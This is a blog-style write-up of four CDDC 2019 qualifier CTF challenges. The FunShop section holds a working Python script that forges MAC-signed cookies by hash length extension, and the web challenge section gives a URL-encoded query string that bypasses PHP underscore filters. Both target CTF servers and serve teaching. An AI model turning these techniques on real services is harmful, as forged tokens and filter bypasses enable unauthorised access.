---
title:  "CDDC 2019 Qualifiers Writeup"
date:   2019-06-04 00:00:00
author: "David"
tags:
    - CTF
    - Crypto
    - Reverse Engineering
    - Web
---

This year's CDDC Qualifiers was very different from the previous year which was more of an 'red team' ctf, this year's qualifiers is a jeopardy style ctf and it's pretty focused on OSINT which I'm not really into, but anyways here are the writeups for some of the more interesting challenges I solved.

## [B-1] Fight the Binary Monster

Category: OSINT_Blue

> Drats, we found an unknown executable that someone uploaded to one of our web servers. How weird, it seems to be make heavy reference to trees. Is the author some kind of environmentalist, perhaps?

### Solution
When we execute the binary it asks us for the domain it is accessing.
```
> .\tree_monster.exe
What domain is being accessed by this executable file?
```

If we grep for a common TLD `.com` in the binary, we find `pastebin.com` and 2 pastebin links.
```bash
cddc/osint_blue/Fight the Binary Monster ➜ strings tree_monster.exe| grep '\.com'
https://pastebin.com/raw/EcrLPtRP
https://pastebin.com/raw/v1cRRWEW
pastebin.com
```

Browsing to `https://pastebin.com/raw/v1cRRWEW` we get the word `post` repeated a lot times.
```
post post post post post post post post post post post post post post post post post post post post post post post post post post post post
```

Browsing to `https://pastebin.com/raw/EcrLPtRP` we get a tree. We see characters of the flag being the nodes of the tree, the previous pastebin link is a hint on using post order traversal to trasverse the tree to get the flag.
![tree](/2019-06-04-CDDC-2019-Qualifiers-Writeup/tree.png)

### Flag
```
$CDDC19${havesometrees}
```

## FunShop

Category: Crypto

> Oops, I forgot what's the product code. Please help me to recover it!
>
> http://funshop.cddc19q.ctf.sg/

### Solution
When we click get on fun ant or fun guy we can see it is sending a get request to `/page/transaction.php` with the corresponding prod_code as the parameter.

![Challenge site](/2019-06-04-CDDC-2019-Qualifiers-Writeup/funshop.png)

When we send one ourself we can see that it's hinting that there's a debug mode we can enable by supplying the `debug_mode=1` get parameter.
```bash
cddc/crypto/FunShop ➜ curl 'http://funshop.cddc19q.ctf.sg/page/transaction.php?prod_code=94-04-3Q
mM-ulP-c0z-k'
<!-- ?debug_mode=1 -->
Success: Actually, I'm not an ant. "I am Groot. :P"
```

When we supply the `debug_mode=1` get parameter, we get the source code of the `transcation.php`.
![Source code](/2019-06-04-CDDC-2019-Qualifiers-Writeup/funshop_sourcecode.png)

To get the flag we have to send a `prod_code` that is not `94-04-3QmM-ulP-c0z-k` or `W8-31-5053-0kX-QiL-1`, but to do this we need to know the private key, lucky for us this is an insecure implementation of a MAC which is vulnerable to hash length extension attack. We get a valid hash and we can append data to it and get the hash for the string with appended data, without having to know the private key. The only requirement for this attack is to know the length of the private key, which we can bruteforce.


Solve script
```python
#!/usr/bin/env python3
import hashpumpy
import base64
import requests
import urllib

url = 'http://funshop.cddc19q.ctf.sg/page/transaction.php'
r = requests.get('{}?prod_code=94-04-3QmM-ulP-c0z-k'.format(url))
transaction_hash = r.cookies['transaction_hash']
prod_code = base64.b64decode(urllib.parse.unquote(r.cookies['prod_code'])).decode()

# brute force the private key length
for i in range(1, 200):
    x = hashpumpy.hashpump(transaction_hash,
        prod_code,
        'data_to_add',
        i)

    new_hash = x[0]
    crafted_data = base64.b64encode(x[1]).decode()

    cookies = {'prod_code': crafted_data, 'transaction_hash': new_hash}

    r = requests.get(url, cookies=cookies)

    if r.text != '<!-- ?debug_mode=1 -->\n':
        print('PRIVATE_KEY length = {}\n{}'.format(i, r.text))
        exit()

print('Failed')
```

```bash
cddc/crypto/FunShop ➜ ./length_extension.py
PRIVATE_KEY length = 14
<!-- ?debug_mode=1 -->
$CDDC19${Me0w_m30w_@wesome!_h0w_c@n_y0u_find_me?_FUNFUN}
```

### Flag
```
$CDDC19${Me0w_m30w_@wesome!_h0w_c@n_y0u_find_me?_FUNFUN}
```

## Lemonade

Category: Reverse

> If we need lemons to make lemonade... Then what about Lemonade.EXE?

### Solution
Looking at the strings in the binary I realized that it is a compiled AutoIT script.

![Strings in the binary](/2019-06-04-CDDC-2019-Qualifiers-Writeup/autoit.png)

Then I looked for a decompiler online and I found [MyAut2EXE](https://files.planet-dl.org/Cw2k/MyAutToExe/index.html).

The tool found the version of AutoIT used to be `AutoIT v3.3.14.5`, and successfully decompiled it. Now we have the source code of the AutoIT script, and we can see the flag in plaintext in the code.

```au3
LOCAL $INT1 = GUICTRLREAD($INPUT1)
LOCAL $INT2 = GUICTRLREAD($INPUT2)
IF $INT1 = "" OR $INT2 = "" THEN

    MSGBOX(0, "NOPEEEE", "Please input numbers :)")
ELSEIF $INT1 = 941228 AND $INT2 = 940628 THEN
    MSGBOX(0, "Congratulations XD!!", "$CDDC19${easy_peasy_Autoit_squeezy}")
ELSEIF NOT STRINGISINT($INT1) OR NOT STRINGISINT($INT2) THEN
    MSGBOX(0, "NOPEEEE", "Only numbers allowed :(")
ELSE
    MSGBOX(0, "Result!!", $INT1 + $INT2)
```

### Flag
```
$CDDC19${easy_peasy_Autoit_squeezy}
```

## \\'_'/

Category: Web

> \\'_'/
>
> http://가나다라마바사아자차카타파하.cddc19q.ctf.sg/

### Solution
When we browse to the site we are given the source code of the php file, I modified it for easier testing locally.
```php
<?php
echo "1: ".strpos($_SERVER["QUERY_STRING"], '_')."<br>";    // strting must start with _
echo "2: ".stripos($_SERVER["QUERY_STRING"], '_')."<br>";   // string must start with _
echo "3: ".strrpos($_SERVER["QUERY_STRING"], '_')."<br>";   // last position of _ in string must be 0
echo "4: ".strripos($_SERVER["QUERY_STRING"], '_')."<br>";  // last position of _ in string must be 0
echo "5: ".strstr($_SERVER["QUERY_STRING"], '_')."<br>";
echo "6: ".strpbrk($_SERVER["QUERY_STRING"], '_')."<br>";
echo "7: ".preg_match("/[a-z][0-9._]/", $_SERVER["QUERY_STRING"])."<br>";
echo "8: ".preg_match("/ABCDEFGHIJKLMNOPQRSTUVWXYZ/", $_SERVER["QUERY_STRING"])."<br>";
print_r($_GET);
echo "=========================================================================<br>";

if( strpos($_SERVER["QUERY_STRING"], '_') == true ) {
    exit("\'1'/");
}

if( stripos($_SERVER["QUERY_STRING"], '_') == true ) {
    exit("\'2'/");
}

if( strrpos($_SERVER["QUERY_STRING"], '_') == true ) {
    exit("\'3'/");
}

if( strripos($_SERVER["QUERY_STRING"], '_') == true ) {
    exit("\'4'/");
}

if( strstr($_SERVER["QUERY_STRING"], '_') == true ) {
    exit("\'5'/");
}

if( strpbrk($_SERVER["QUERY_STRING"], '_') == true ) {
    exit("\'6'/");
}

if( preg_match("/[a-z][0-9._]/", $_SERVER["QUERY_STRING"]) ) {
    exit("\'7'/");
}

if( preg_match("/ABCDEFGHIJKLMNOPQRSTUVWXYZ/", $_SERVER["QUERY_STRING"]) ) {
    exit("\'8'/");
}

if( isset($_GET["_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_"]) ) {
    if( $_GET['_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_'] == "🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️" ) {
        echo "CTF{Flag}";
    } else {
        echo "Param value not correct";
    }
}
else {
    echo "Required param not set";
}
?>
```
After some testing we found out these 2 conditions has to be true.
1. strting must start with _
2. last position of _ in string must be 0

Which is not possible if we want to set the get parameter `_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_`. Then it just hit me that the korean subdomain is a hint to the solution, url encoding. Since `$_SERVER["QUERY_STRING"` gets the query string without parsing it, this should work.

I used this Cyber Chef recipe to url encode `_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_`.
```
To_Hex('Space')
Find_/_Replace({'option':'Regex','string':'\\s'},'%',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'^'},'%',true,false,true,false)
```

This is our payload url.
```
http://가나다라마바사아자차카타파하.cddc19q.ctf.sg/?%5f%31%32%33%34%35%36%37%38%39%30%2d%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%2d%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%5f=🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️
```

Sure enought it worked.

![](/2019-06-04-CDDC-2019-Qualifiers-Writeup/php_flag.png)

### Flag
```
$CDDC19${PHP_tricks_are_very_fun!}
```
